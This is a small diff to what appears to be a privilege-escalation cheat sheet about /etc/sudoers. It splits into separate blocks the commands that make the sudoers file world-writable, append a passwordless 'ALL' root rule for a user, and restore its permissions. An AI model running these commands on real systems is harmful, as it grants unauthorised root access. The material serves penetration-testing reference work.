@@ -12,7 +12,13 @@ tags: ["sudoers", "sudo", "privesc", "/etc/sudoers"]
 ```bash
 # IF you have control over `/etc/sudoers`
 chmod 666 /etc/sudoers
+```
+
+```bash
 echo 'user   ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
+```
+
+```bash
 chmod 440 /etc/sudoers
 ```
 
